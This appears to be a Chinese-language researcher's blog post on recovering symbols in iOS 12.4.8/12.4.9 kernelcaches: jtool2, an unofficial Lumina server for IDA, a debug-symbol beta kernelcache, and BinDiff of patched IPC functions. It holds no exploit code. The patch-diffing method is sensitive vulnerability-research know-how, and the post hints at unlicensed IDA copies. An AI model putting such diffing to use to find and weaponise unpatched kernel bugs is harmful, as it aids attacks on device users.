&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150712081.png&quot; alt=&quot;image-20210131150712081&quot; /&gt;&lt;/p&gt;

&lt;p&gt;随着疑惑越来越多，第一反应当然是谷歌搜索，看看有没有前辈们的经验可以借鉴学习的&lt;/p&gt;

&lt;p&gt;最先找到的是jtool2，它有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--analyze&lt;/code&gt;选项可以获取到kernelcache文件里的符号&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://newosxbook.com/tools/jtool.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--analyze&lt;/code&gt;生成符号文件&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  jtool2 ./jtool2 --analyze kernelcache.release.iphone7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;生成的符号文件格式有如下七种类型，可能有更多，我这里只关注到这几个，其中又以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_func_xxxxxxxxxxxxxxxx&lt;/code&gt;最多，数量还是太少&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xfffffff00767b9c8|_func_fffffff00767b9c8|
0xfffffff00767b9f4|_func_fffffff00767b9f4|

0xfffffff00767bfc0|_strlen|Rule type 0 #1
0xfffffff00767c050|_getsectbynamefromheader|Rule type 1 #4

0xfffffff007694be0|_ipc_object_translate|Flow for _mk_timer_destroy_trap, call 0
0xfffffff0076ab374|_ipc_object_translate|Flow for __Xmach_port_guard, call 1

0xfffffff0074fe4c8|__ZTV35IOAccessoryPowerSourceItemUSBDevice|
0xfffffff0074fe610|__ZTV34IOAccessoryPowerSourceItemExternal|
0xfffffff0074fe758|__ZTV42IOAccessoryPowerSourceItemUSB_ChargingPort|
0xfffffff0074fe880|__ZTV47IOAccessoryPowerSourceItemUSB_DataContactDetect|
0xfffffff0074fe9c8|__ZTV43IOAccessoryPowerSourceItemUSB_TypeC_Current|
0xfffffff0074feb10|__ZTV33IOAccessoryPowerSourceItemBrickID|

0xfffffff008713f4c|IOAudioCodecsUserClient method 0|IOAudioCodecsUserClient method 0
0xfffffff008713f58|IOAudioCodecsUserClient method 1|IOAudioCodecsUserClient method 1
0xfffffff008713f64|IOAudioCodecsUserClient method 2|IOAudioCodecsUserClient method 2
0xfffffff008713f78|IOAudioCodecsUserClient method 3|IOAudioCodecsUserClient method 3
0xfffffff008713f84|IOAudioCodecsUserClient method 4|IOAudioCodecsUserClient method 4
0xfffffff008713f90|IOAudioCodecsUserClient method 5|IOAudioCodecsUserClient method 5

0xfffffff008941278|redirect|
0xfffffff00894127c|hlim|
0xfffffff008941280|defmcasthlim|
0xfffffff008941284|accept_rtadv|

0xffffffffffffff80|skywalk.mem|zone
0xffffffffffffffa0|necp.clientfd|zone
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;本来想着jtool2生成的符号会很漂亮，我就写了一个脚本来自动化恢复符号，现在看来要吃灰了&lt;/p&gt;

&lt;p&gt;思路就是获取所有的函数，然后获取地址跟函数名，匹配符号文件的数据，再把符号替换掉函数名&lt;/p&gt;

&lt;p&gt;这里会有几个问题，第一个问题就是上面的符号其实并不能直接用，需要二次处理，比如把空格替换成下划线，还有重名函数的问题等等&lt;/p&gt;

&lt;p&gt;那么这个方法到这里就暂时放一边了&lt;/p&gt;

&lt;p&gt;我又继续搜，发现了一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ida_kernelcache&lt;/code&gt;的项目，不过这个三年前的项目年久失修，我没跑起来，这个脚本应该是要好好研究一下的，学习作者的解析思路&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/bazad/ida_kernelcache&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在自己研究无果后，我选择直接找大佬问解决方法&lt;/p&gt;

&lt;p&gt;一问才发现原来这么些年我竟然没几个认识的搞iOS系统安全的朋友&lt;/p&gt;

&lt;p&gt;不过总归还是有收获的，一位师傅建议我看一下IDA的Lumina功能，另一位师傅跟我说iOS的一个beta版本包含有调试符号的kernelcache&lt;/p&gt;

&lt;p&gt;首先来讲Lumina，这是从IDA 7.2开始引进的一个实验性功能，它的作用就是动态从Lumina服务器获取函数的数据，比如我正在分析一个静态编译的固件，然后使用Lumina，它可以将函数的哈希发送到Lumina服务器匹配再返回对应的数据，相当于一个动态的FLIRT&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150732265.png&quot; alt=&quot;image-20210131150732265&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为众所周知的原因，Windows的IDA目前有最新的7.5，macOS只有7.0，而Lumina是从IDA 7.2开始引进的，所以我们切换到Windows的IDA 7.5&lt;/p&gt;

&lt;p&gt;又是众所周知的原因，我们手上的IDA不能访问Lumina服务器，有位大佬搭建了一个私服&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/naim94a/lumen&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{IDA_HOME}\cfg\ida.cfg&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LUMINA_HOST = &quot;lumen.abda.nl&quot;;
LUMINA_PORT = 1234
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;下载&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hexrays.crt&lt;/code&gt;放到IDA根目录，重启IDA即可&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://lumen.abda.nl/cert&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我这里尝试了一下，恢复了一小部分符号，距离舒舒服服的分析还是有差距&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150747923.png&quot; alt=&quot;image-20210131150747923&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另一个是师傅和我说的一个拥有调试符号的kernelcache&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://twitter.com/tihmstar/status/1295814618242318337&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;从这个地址下载&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://updates.cdn-apple.com/2020SummerSeed/fullrestores/001-32635/423F68EA-D37F-11EA-BB8E-D1AE39EBB63D/iPhone11,8,iPhone12,1_14.0_18A5342e_Restore.ipsw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;按照上面的步骤解压缩ipsw固件获得一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernelcache.research.iphone12b&lt;/code&gt;，对其进行解析&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  jtool2 ./jtool2 -dec kernelcache.research.iphone12b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;解析完成后会生成文件&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/kernel&lt;/code&gt;，拷贝重命名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernelcache.research.iphone12b.bin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;尝试分析提取符号，发现有15万+的符号，惊喜！以下将其记为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_symbols&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  jtool2 ./jtool2 --analyze kernelcache.research.iphone12b.bin
...
opened companion file ./kernelcache.research.iphone12b.bin.ARM64.CCA1C472-EE81-32F2-8AB8-2ADD55281591
Dumping symbol cache to file
Symbolicated 150904 symbols and 47 functions
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么此时我们拥有两个一丁点符号都没有的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.8&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.9&lt;/code&gt;，以及一个全是符号的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_symbols&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;首先我们需要对比出补丁版本修改后的函数，为了结果更加准确，这里使用Windows平台的IDA 7.5，有差异的函数也是八个&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150803613.png&quot; alt=&quot;image-20210131150803613&quot; /&gt;&lt;/p&gt;

&lt;p&gt;对diff结果做一个记录，方便后面搜索&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;kc_12.4.8_address&lt;/th&gt;
      &lt;th&gt;kc_12.4.8_func_name&lt;/th&gt;
      &lt;th&gt;kc_12.4.9_address&lt;/th&gt;
      &lt;th&gt;kc_12.4.9_func_name&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076A8278&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A8278&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076A82A8&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A82A8&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF00768E3AC&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF00768E3AC&lt;/td&gt;
      &lt;td&gt;FFFFFFF00768E3BC&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF00768E3BC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF00768E164&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF00768E164&lt;/td&gt;
      &lt;td&gt;FFFFFFF00768E164&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF00768E164&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076A7824&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A7824&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076A7840&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A7840&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076A7A98&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A7A98&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076A7AC0&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A7AC0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076BE438&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BE438&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076BE470&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BE470&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076BF8C8&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BF8C8&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076BF90C&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BF90C&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076BB33C&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BB33C&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076BB370&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BB370&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;我们再对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.8&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_symbols&lt;/code&gt;进行比对&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150820049.png&quot; alt=&quot;image-20210131150820049&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有识别效果好的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150832475.png&quot; alt=&quot;image-20210131150832475&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也有识别效果可能有错的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150845563.png&quot; alt=&quot;image-20210131150845563&quot; /&gt;&lt;/p&gt;

&lt;p&gt;八个差异函数对比结果记录如下&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;kc_12.4.8_address&lt;/th&gt;
      &lt;th&gt;kc_12.4.8_func_name&lt;/th&gt;
      &lt;th&gt;kc_12.4.9_address&lt;/th&gt;
      &lt;th&gt;kc_12.4.9_func_name&lt;/th&gt;
      &lt;th&gt;bindiff_symbol&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076A8278&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A8278&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076A82A8&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A82A8&lt;/td&gt;
      &lt;td&gt;IOMFB::UPBlock_VFTG_v1::get_expected_timings(IOMFB::UPBlock_VFTG::Timings *)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF00768E3AC&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF00768E3AC&lt;/td&gt;
      &lt;td&gt;FFFFFFF00768E3BC&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF00768E3BC&lt;/td&gt;
      &lt;td&gt;_ipc_kmsg_get_from_kernel&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF00768E164&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF00768E164&lt;/td&gt;
      &lt;td&gt;FFFFFFF00768E164&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF00768E164&lt;/td&gt;
      &lt;td&gt;_ipc_kmsg_get&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076A7824&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A7824&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076A7840&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A7840&lt;/td&gt;
      &lt;td&gt;_mach_gss_accept_sec_context_v2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076A7A98&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A7A98&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076A7AC0&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076A7AC0&lt;/td&gt;
      &lt;td&gt;AppleCS46L21IDPT::_startTransfer(AppleCS46L21IDPT::IDIO_Cmd_Packet *,ulong long,ulong long)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076BE438&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BE438&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076BE470&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BE470&lt;/td&gt;
      &lt;td&gt;_ipc_port_send_turnstile_prepare&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076BF8C8&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BF8C8&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076BF90C&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BF90C&lt;/td&gt;
      &lt;td&gt;_ptmx_get_ioctl&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FFFFFFF0076BB33C&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BB33C&lt;/td&gt;
      &lt;td&gt;FFFFFFF0076BB370&lt;/td&gt;
      &lt;td&gt;sub_FFFFFFF0076BB370&lt;/td&gt;
      &lt;td&gt;_vm_compressor_pager_reap_pages&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;表格太大，做一下精简，提取出添加了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bzero()&lt;/code&gt;的五个函数，有两个相似度超过百分之五十的能够正确匹配，有三个函数相似度都在百分之三十以下，并没有正确匹配上&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;kc_12.4.8_func_name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;kc_12.4.9_func_name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Similarity&lt;/th&gt;
      &lt;th&gt;bindiff_symbol&lt;/th&gt;
      &lt;th&gt;true_symbol&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E3AC&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E3BC&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.58&lt;/td&gt;
      &lt;td&gt;_ipc_kmsg_get_from_kernel&lt;/td&gt;
      &lt;td&gt;ipc_kmsg_get_from_kernel&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E164&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E164&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.96&lt;/td&gt;
      &lt;td&gt;_ipc_kmsg_get&lt;/td&gt;
      &lt;td&gt;ipc_kmsg_get&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076A7824&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076A7840&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.13&lt;/td&gt;
      &lt;td&gt;_mach_gss_accept_sec_context_v2&lt;/td&gt;
      &lt;td&gt;xxxxx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BE438&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BE470&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.11&lt;/td&gt;
      &lt;td&gt;_ipc_port_send_turnstile_prepare&lt;/td&gt;
      &lt;td&gt;xxxxx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BF8C8&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BF90C&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.28&lt;/td&gt;
      &lt;td&gt;_ptmx_get_ioctl&lt;/td&gt;
      &lt;td&gt;xxxxx&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;现在还剩下三个函数没有匹配到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_send&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_overwrite&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kobject_server&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;再一次陷入僵局，突然想到作者说的XNU源码字符串也可以找一下&lt;/p&gt;

&lt;p&gt;反编译三个没有匹配到符号的函数，发现函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_FFFFFFF0076BE438&lt;/code&gt;存在字符串&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150900953.png&quot; alt=&quot;image-20210131150900953&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过源码找到一个函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;default:
	panic(&quot;ipc_kobject_server: strange destination rights&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在还剩两个函数没有匹配到符号，又没有符号&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;kc_12.4.8_func_name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;kc_12.4.9_func_name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Similarity&lt;/th&gt;
      &lt;th&gt;bindiff_symbol&lt;/th&gt;
      &lt;th&gt;true_symbol&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E3AC&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E3BC&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.58&lt;/td&gt;
      &lt;td&gt;_ipc_kmsg_get_from_kernel&lt;/td&gt;
      &lt;td&gt;ipc_kmsg_get_from_kernel&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E164&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E164&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.96&lt;/td&gt;
      &lt;td&gt;_ipc_kmsg_get&lt;/td&gt;
      &lt;td&gt;ipc_kmsg_get&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076A7824&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076A7840&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.13&lt;/td&gt;
      &lt;td&gt;_mach_gss_accept_sec_context_v2&lt;/td&gt;
      &lt;td&gt;xxxxx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BE438&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BE470&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.11&lt;/td&gt;
      &lt;td&gt;_ipc_port_send_turnstile_prepare&lt;/td&gt;
      &lt;td&gt;ipc_kobject_server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BF8C8&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BF90C&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.28&lt;/td&gt;
      &lt;td&gt;_ptmx_get_ioctl&lt;/td&gt;
      &lt;td&gt;xxxxx&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;这就有点难为小王了&lt;/p&gt;

&lt;p&gt;我又找到了一篇文章&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://supergithuber.github.io/ios/exportiOSSystemSymbol.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里的原理我暂时还没有弄明白，我这里只做一下记录&lt;/p&gt;

&lt;p&gt;前面所有的步骤我们都是将ipsw固件解压缩之后，直接获取解压缩根目录下的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernel.release.iphonexxx&lt;/code&gt;文件进行处理&lt;/p&gt;

&lt;p&gt;这篇文章里的方式是使用解压缩的其它文件来获取系统符号，以12.4.8的固件为例，解压后有下面这些文件&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  iPhone_4.7_12.4.8_16G201_Restore ls -al
drwxr-xr-x@ 19 wnagzihxa1n  staff         608 Jan  5 15:26 .
drwxr-xr-x  10 wnagzihxa1n  staff         320 Jan  5 15:39 ..
-rw-r--r--@  1 wnagzihxa1n  staff  2874835794 Jan  9  2007 038-60223-004.dmg
-rw-r--r--@  1 wnagzihxa1n  staff    93846555 Jan  9  2007 038-60285-004.dmg
-rw-r--r--@  1 wnagzihxa1n  staff    91602971 Jan  9  2007 038-60305-004.dmg
-rw-r--r--@  1 wnagzihxa1n  staff      128367 Jan  9  2007 BuildManifest.plist
drwxr-xr-x@ 10 wnagzihxa1n  staff         320 Jan  9  2007 Firmware
-rw-r--r--@  1 wnagzihxa1n  staff         985 Jan  9  2007 Restore.plist
-rw-r--r--@  1 wnagzihxa1n  staff    14061377 Jan  9  2007 kernelcache.release.iphone7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;下载工具iDecrypt&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://supergithuber.github.io/Resources/iDecrypt-Mac-build91-bennyyboi.zip&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;选择解压缩后的最大的那个dmg文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150919771.png&quot; alt=&quot;image-20210131150919771&quot; /&gt;&lt;/p&gt;

&lt;p&gt;解压缩的key从下面这个网站搜索&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.theiphonewiki.com/wiki/Firmware/iPhone/12.x&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由于iOS 10之后不再加密，所以这里其实可以直接双击&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;038-60223-004.dmg&lt;/code&gt;挂载读取文件，emmmmmm&lt;/p&gt;

&lt;p&gt;在如下目录找到一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dyld_shared_cache_arm64&lt;/code&gt;文件&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/System/Library/Caches/com.apple.dyld/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;提取出来做解析的准备&lt;/p&gt;

&lt;p&gt;接下来编译解析工具dyld，我使用的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dyld-519.2.2&lt;/code&gt;，高版本编译会提示找不到头文件&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://opensource.apple.com/tarballs/dyld/&lt;/li&gt;
  &lt;li&gt;https://opensource.apple.com/tarballs/dyld/dyld-519.2.2.tar.gz&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如图修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dyld-519.2.2/launch-cache/dsc_extractor.cpp&lt;/code&gt;，将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;改为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150938852.png&quot; alt=&quot;image-20210131150938852&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用clang编译&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  launch-cache clang++ -o dsc_extractor ./dsc_extractor.cpp dsc_iterator.cpp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

